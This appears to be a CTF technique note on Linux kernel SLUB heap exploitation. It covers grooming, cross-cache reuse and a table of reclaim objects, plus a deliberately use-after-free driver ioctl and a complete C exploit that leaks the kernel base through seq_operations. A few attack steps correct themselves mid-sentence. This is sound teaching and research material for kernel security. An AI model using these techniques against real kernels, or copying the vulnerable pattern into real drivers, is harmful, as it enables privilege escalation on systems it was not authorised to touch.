---
title: "Kernel Heap - SLUB Grooming, Cross-Cache, and the Classic UAF Objects"
category: pwn
subcategory: kernel
type: technique
tags: [kernel, slub, kmalloc, slab, uaf, msg-msg, tty-struct, pipe-buffer, seq-operations, timerfd-ctx, setxattr, cross-cache, freelist-hardened, kmalloc-cg, heap-spray, qemu, pwndbg, gef]
difficulty: hard
summary: "How SLUB hands out objects, how to groom it, and the standard victim structures that turn a kernel UAF into a leak or a call."
when_to_use:
  - "The driver has a use-after-free or an out-of-bounds write on a kmalloc'd object"
  - "You need to reclaim a freed object with something you control"
  - "You need a kernel text leak before you can build a ROP chain"
  - "The object's cache is GFP_KERNEL_ACCOUNT (kmalloc-cg-*) and your usual spray fails"
tools: [qemu, gdb, pwndbg, gef, gcc]
related: [kernel-setup-and-debug, kernel-mitigations, kernel-race-widening, kernel-modprobe-path, kernel-pwn-cheatsheet]
---

## TL;DR

SLUB serves allocations from per-CPU slabs with a LIFO freelist. Free an object, then
immediately allocate a same-size object you control, and you land on it. The art is
(a) picking a victim structure whose fields give you a leak or a call, and (b) knowing
which `kmalloc-*` cache each one lives in. `seq_operations` (kmalloc-32) for text
leaks, `msg_msg` (kmalloc-cg-*) for read/write, `tty_struct` (kmalloc-1024) and
`pipe_buffer` (kmalloc-1024) for control flow.

## Recognise it

- `kfree(obj)` without NULLing the pointer, plus a later `ioctl` that reads or writes
  through it.
- An OOB write on a `kmalloc(n)` buffer that reaches the next object.
- A refcount bug (`put` called twice) on a kernel object.
- The driver's allocation size tells you the cache: `kmalloc(32)` -> `kmalloc-32`.

## Vulnerable code shape

```c
static char *obj;

static long vuln_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
    struct req r;
    copy_from_user(&r, (void __user *)arg, sizeof r);

    switch (cmd) {
    case CMD_ALLOC:
        obj = kmalloc(r.size, GFP_KERNEL);
        return 0;
    case CMD_FREE:
        kfree(obj);            /* BUG: obj not NULLed -> UAF */
        return 0;
    case CMD_READ:
        return copy_to_user(r.buf, obj, r.size);     /* read the reclaimer */
    case CMD_WRITE:
        return copy_from_user(obj, r.buf, r.size);   /* write the reclaimer */
    }
    return -EINVAL;
}
```

## Theory

Targets: Linux 4.x - 6.x. The `kmalloc-cg-*` split lands in 5.14.

### SLUB basics

- General allocations come from `kmalloc-8` .. `kmalloc-8k`; anything larger goes to
  the page allocator.
- Each cache has a **per-CPU active slab** (`c->freelist`) plus per-node partial lists.
  Allocation pops the head, free pushes onto it: **LIFO**, so the last thing freed is
  the next thing allocated. That is what makes reclaiming reliable.
- The free pointer lives **inside the free object** at `s->offset`, and with
  `CONFIG_SLAB_FREELIST_HARDENED` it is mangled
  (`ptr ^ s->random ^ swab(addr_of_freeptr)`) - unforgeable without leaking
  `s->random`. `CONFIG_SLAB_FREELIST_RANDOM` shuffles the initial order in a fresh
  slab but does not affect LIFO reuse.
- **`kmalloc-cg-*` (5.14+)**: `GFP_KERNEL_ACCOUNT` allocations live in a separate set
  of caches. `msg_msg` and `seq_file` buffers moved there, so a plain-`GFP_KERNEL`
  driver object can no longer be reclaimed with `msg_msg` - this broke a generation of
  public exploits.

### Grooming recipe

```
1. Allocate N (say 64) filler objects of the victim size.   -> fill the partial slabs
2. Free every other one.                                     -> holes in a known pattern
3. Free the victim.                                          -> victim is at the head
4. Immediately allocate the reclaimer object.                -> it lands on the victim
```

Pin to one CPU (`sched_setaffinity`) - the per-CPU freelist is the whole mechanism.

### Cross-cache attack

When the victim's cache has no useful reclaimer (e.g. `kmalloc-cg-1k` vs `tty_struct`
in `kmalloc-1k`), free the whole **slab page** back to the buddy allocator and
re-allocate that physical page as something else:

```
1. Allocate enough objects to open a fresh slab (order-N pages).
2. Free ALL objects in that slab so the page becomes empty.
3. The page returns to the buddy allocator (force it with cpu_partial
   pressure: allocate more objects of the same size).
4. Spray page-sized allocations of the target type: pipe_buffer arrays,
   page tables (mmap + touch), or another kmem_cache.
5. The stale pointer now points into the new object.
```

This is how modern kernelCTF exploits get from a `kmalloc-cg` UAF to a `pipe_buffer`
or to a **page table entry** (physical read/write).

### The victim objects

| object | cache | allocate with | free with | what you get |
|--------|-------|---------------|-----------|--------------|
| `msg_msg` | `kmalloc-cg-64`..`-4k` (5.14+), `kmalloc-*` before | `msgsnd(qid, buf, size, 0)` | `msgrcv(qid, buf, size, 0, 0)` | attacker-controlled contents of almost any size; corrupting `m_ts` gives an OOB read, corrupting `next` gives an arbitrary read |
| `seq_operations` | `kmalloc-32` | `open("/proc/self/stat")` | `close(fd)` | 4 kernel function pointers (`start`, `stop`, `next`, `show`) -> instant kernel text leak; overwrite `start` and `read()` the fd to call it |
| `tty_struct` | `kmalloc-1024` | `open("/dev/ptmx")` | `close(fd)` | `magic == 0x5401` for detection, `ops` pointer -> control flow via any tty ioctl |
| `pipe_buffer` | `kmalloc-1024` (array of 16 x 40 bytes) | `pipe()` then write | `close()` both ends | `ops` -> `release` called on close (control flow); `page` -> arbitrary physical page (read/write) |
| `timerfd_ctx` | `kmalloc-256` | `timerfd_create(CLOCK_REALTIME, 0)` | `close(fd)` | an `hrtimer` with a `function` pointer fired on expiry |
| `subprocess_info` | `kmalloc-128` | `socket(AF_XXX,...)` triggers it | n/a | contains `modprobe_path`-adjacent data; mainly a leak source |
| `shm_file_data` | `kmalloc-32` | `shmat()` | `shmdt()` | `ns` and `file` pointers -> kernel and heap leaks |
| `sk_buff` | `kmalloc-512`..`-4k` | `sendmsg` on a socketpair | `recvmsg` | controlled contents; its `shinfo` trailer is a useful leak |
| `user_key_payload` | `kmalloc-*` any size | `add_key("user", desc, buf, len, ...)` | `keyctl(KEYCTL_REVOKE, id)` | controlled contents, readable back with `keyctl(KEYCTL_READ)` |
| `setxattr` buffer | `kmalloc-*` any size | `setxattr(path, name, buf, len, 0)` | freed immediately on return | **transient**: fully controlled bytes for the duration of the syscall - perfect for winning a race |

### The two workhorses

**`seq_operations`** (kmalloc-32) is the fastest kernel text leak available:
`open("/proc/self/stat")` allocates a 32-byte object holding four kernel `.text`
pointers. Read the freed object and KASLR is gone. Overwrite `start` and
`read(fd, buf, 1)` calls it.

**`msg_msg`** gives read *and* write:

```c
struct msg_msg {
    struct list_head m_list;   /* +0x00 next, +0x08 prev */
    long m_type;               /* +0x10 */
    size_t m_ts;               /* +0x18 message text size */
    struct msg_msgseg *next;   /* +0x20 */
    void *security;            /* +0x28 */
    /* message body follows at +0x30 */
};
```

- Enlarge `m_ts` -> `msgrcv` copies more than was allocated -> **OOB read**.
- Point `next` at an arbitrary address -> the segment chain is read from there ->
  **arbitrary read** (use `MSG_COPY` to read without destroying the message).
- Combined with `MSG_COPY` (needs `CONFIG_CHECKPOINT_RESTORE`) you can read repeatedly.

## Attack

Concrete: `kmalloc-32` UAF, leak kernel text with `seq_operations`, then pivot.

1. `pin_cpu0()`.
2. `ioctl(CMD_ALLOC, 32)` - the driver allocates the victim.
3. `ioctl(CMD_FREE)` - victim freed, sits at the head of `kmalloc-32`'s freelist.
4. `open("/proc/self/stat")` - the kernel allocates a `seq_file` whose `op` field
   points at `single_start`/`single_stop`/... Actually the 32-byte object here is
   `struct seq_operations` for `/proc/self/stat`; opening it allocates from
   `kmalloc-32` and it lands on the victim.
5. `ioctl(CMD_READ, buf, 32)` - read the four function pointers. **Kernel text leak.**
   `kbase = leaked_start - OFF_SINGLE_START`.
6. `ioctl(CMD_WRITE, ...)` - overwrite `start` with a gadget or with
   `modprobe_path`-writing code... you cannot write code, so instead:
   overwrite `start` with a stack-pivot gadget and build a ROP chain, **or**
   skip control flow entirely: use the leak to locate `modprobe_path` and use a
   *different* write primitive on it (see `kernel-modprobe-path`).
7. `read(fd, buf, 1)` - calls `seq->op->start(...)`.

## Heap state

```text
kmalloc-32 slab, per-CPU

  c->freelist -> [ obj7 ] -> [ obj4 ] -> [ obj1 ] -> NULL
                    ^ last freed is first out (LIFO)

step 2-3: the driver's object is freed

  c->freelist -> [ VICTIM ] -> [ obj7 ] -> ...

step 4: open("/proc/self/stat") allocates 32 bytes onto VICTIM

    +0x00 | start -> single_start    |  <- kernel .text pointer
    +0x08 | stop  -> single_stop     |
    +0x10 | next  -> single_next     |
    +0x18 | show  -> proc_single_show|

step 5: ioctl(CMD_READ) through the dangling pointer
  -> 32 bytes of kernel pointers copied to userland.  KASLR defeated.

step 6-7: write start = <gadget>, then read(fd, ...)
  seq_read -> m->op->start(m, &pos)   <- indirect call, rdi = seq_file*
  (blocked by kCFI if enabled; otherwise your gadget runs in ring 0)

msg_msg arbitrary read  (kmalloc-cg-64 .. -4k)

    +0x00 m_list.next   +0x18 m_ts    <- enlarge for an OOB read
    +0x08 m_list.prev   +0x20 next    <- point at TARGET-0x8 for arbitrary read
    +0x10 m_type        +0x28 security    +0x30 body ...

  msgrcv(qid, buf, big, 0, MSG_COPY|IPC_NOWAIT)
    -> copies m_ts bytes, following `next` for the tail
    -> returns kernel memory from TARGET
```

## Exploit

```c
/* slub_uaf.c - kmalloc-32 UAF -> seq_operations kernel text leak,
 * plus reusable tty_struct / msg_msg / pipe_buffer spray helpers.
 * Build: gcc -static -O2 -no-pie -o exp slub_uaf.c
 */
#define _GNU_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/xattr.h>
#include <unistd.h>

#define DEVICE "/dev/vuln"
#define CMD_ALLOC 0x1000
#define CMD_FREE  0x1001
#define CMD_READ  0x1002
#define CMD_WRITE 0x1003

/* offset of single_start from _text, from `nm vmlinux` */
#define OFF_SINGLE_START 0x0356A80UL
#define OFF_MODPROBE_PATH 0x1A4B420UL

#define SPRAY 64

struct req {
    unsigned long idx;
    unsigned long size;
    void *buf;
};

struct msgbuf_t {
    long mtype;
    char mtext[0x2000];
};

static int fd = -1;

static void die(const char *m)
{
    perror(m);
    exit(1);
}

static void pin_cpu0(void)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    if (sched_setaffinity(0, sizeof set, &set) < 0)
        die("sched_setaffinity");
}

static long v_alloc(unsigned long size)
{
    struct req r = { .idx = 0, .size = size, .buf = NULL };
    return ioctl(fd, CMD_ALLOC, &r);
}

static long v_free(void)
{
    struct req r = { 0 };
    return ioctl(fd, CMD_FREE, &r);
}

static long v_read(void *buf, unsigned long size)
{
    struct req r = { .idx = 0, .size = size, .buf = buf };
    return ioctl(fd, CMD_READ, &r);
}

static long v_write(void *buf, unsigned long size)
{
    struct req r = { .idx = 0, .size = size, .buf = buf };
    return ioctl(fd, CMD_WRITE, &r);
}

/* ---------------- reclaimer sprays ---------------- */

/* kmalloc-32: struct seq_operations, via any single_open() procfs file. */
static int spray_seq_operations(int *fds, int n)
{
    int i;
    for (i = 0; i < n; i++) {
        fds[i] = open("/proc/self/stat", O_RDONLY);
        if (fds[i] < 0)
            return i;
    }
    return n;
}

/* kmalloc-1024: struct tty_struct. magic field is 0x5401. */
static int spray_tty(int *fds, int n)
{
    int i;
    for (i = 0; i < n; i++) {
        fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
        if (fds[i] < 0)
            return i;
    }
    return n;
}

/* kmalloc-cg-*: struct msg_msg with fully controlled contents. */
static int spray_msg_msg(int qid, const void *body, size_t len, int n)
{
    struct msgbuf_t m;
    int i;

    if (len > sizeof m.mtext)
        len = sizeof m.mtext;
    m.mtype = 1;
    memcpy(m.mtext, body, len);
    for (i = 0; i < n; i++)
        if (msgsnd(qid, &m, len, IPC_NOWAIT) < 0)
            return i;
    return n;
}

/* Transient controlled bytes for the duration of one syscall: perfect for
 * winning a race window. The buffer is kmalloc'd, filled, then freed. */
static void spray_setxattr(const void *body, size_t len, int n)
{
    int i;
    for (i = 0; i < n; i++)
        setxattr("/tmp", "user.x", body, len, 0);
}

/* ---------------- the exploit ---------------- */

static unsigned long leak_kernel_base(void)
{
    unsigned long leak[4];
    int seq_fds[SPRAY];
    int got;

    if (v_alloc(32) < 0)
        die("CMD_ALLOC");
    if (v_free() < 0)
        die("CMD_FREE");

    got = spray_seq_operations(seq_fds, SPRAY);
    printf("[*] sprayed %d seq_operations\n", got);

    memset(leak, 0, sizeof leak);
    if (v_read(leak, sizeof leak) < 0)
        die("CMD_READ");

    printf("[*] leaked: %#lx %#lx %#lx %#lx\n",
           leak[0], leak[1], leak[2], leak[3]);

    if ((leak[0] >> 40) != 0xFFFFFF) {
        puts("[-] that does not look like a kernel pointer - respray");
        return 0;
    }
    return leak[0] - OFF_SINGLE_START;
}

int main(void)
{
    unsigned long kbase, modprobe;
    char payload[32];

    pin_cpu0();

    fd = open(DEVICE, O_RDWR);
    if (fd < 0)
        die("open " DEVICE);

    kbase = leak_kernel_base();
    if (!kbase)
        return 1;
    modprobe = kbase + OFF_MODPROBE_PATH;
    printf("[+] kernel base   = %#lx\n", kbase);
    printf("[+] modprobe_path = %#lx\n", modprobe);

    /* From here: use the UAF write to hijack seq_operations->start, or
     * pair the leak with a separate write primitive to smash modprobe_path.
     * Demonstrate the write half by restoring a sane seq_operations so the
     * process does not die on close(). */
    memset(payload, 0, sizeof payload);
    *(unsigned long *)payload = kbase + OFF_SINGLE_START;
    if (v_write(payload, sizeof payload) < 0)
        die("CMD_WRITE");
    puts("[+] UAF write confirmed");

    /* Keep the other sprays referenced so the compiler keeps them. */
    (void)spray_tty;
    (void)spray_msg_msg;
    (void)spray_setxattr;
    return 0;
}
```

## Variants & pitfalls

- **Pin the CPU.** Without `sched_setaffinity` the freelist you free into and the one
  you allocate from may differ. This alone fixes most flaky exploits.
- **`kmalloc-cg-*` (5.14+).** Check the driver's GFP flags. `GFP_KERNEL_ACCOUNT` means
  a different cache; `msg_msg` and `seq_file` buffers are cg-accounted, `tty_struct`
  and `pipe_buffer` are not.
- **`CONFIG_SLAB_FREELIST_HARDENED`** XOR-mangles the free pointer with a per-cache
  random value, so freelist forgery needs a leak of `s->random`. Prefer reclaim.
- **Object detection.** After a spray, check a magic field: `tty_struct.magic ==
  0x5401`, `seq_operations` pointers having the `0xffffffff8` prefix.
- **Do not free the victim twice.** A SLUB double free corrupts the freelist and
  panics later, far from your code.
- **`pipe_buffer->page`** is the strongest entry in the table: replacing it gives
  physical-memory read/write, and it is what cross-cache exploits aim for.
- **Noise.** Other processes allocate from the same caches. Do the free and the spray
  back-to-back, with no `printf` in between (printf allocates).
- **Slab merging.** SLUB merges caches of the same size and flags unless
  `slab_nomerge` is set - which *helps* you.

## Debugging

```text
pwndbg> p sizeof(struct msg_msg)
pwndbg> p sizeof(struct tty_struct)
pwndbg> p &single_start
pwndbg> b __kmalloc
pwndbg> b kfree
pwndbg> p ((struct kmem_cache*)$rdi)->name
pwndbg> x/8gx <victim_addr>
pwndbg> p *(struct seq_operations *)<victim_addr>
pwndbg> p *(struct tty_struct *)<victim_addr>
```

```bash
# Inside the VM:
cat /proc/slabinfo | head -20              # needs root; shows cache sizes and counts
grep -E 'kmalloc-(32|64|256|1k)' /proc/slabinfo
cat /sys/kernel/slab/kmalloc-32/object_size 2>/dev/null
# Check whether slab merging is on:
cat /proc/cmdline | grep -o slab_nomerge
```

## Tools

- `gdb` + `pwndbg` with kernel struct definitions (needs a kernel built with
  `CONFIG_DEBUG_INFO`, which CTF images often have).
- `/proc/slabinfo` and `/sys/kernel/slab/*` during development as root.
- `pahole vmlinux -C msg_msg` for exact field offsets if you have BTF.

## References

- Linux `mm/slub.c`, `ipc/msgutil.c` (`msg_msg`), `fs/seq_file.c`,
  `drivers/tty/tty_io.c`, `fs/pipe.c`.
- The `kmalloc-cg-*` split: Linux 5.14 `mm: memcg/slab` series.
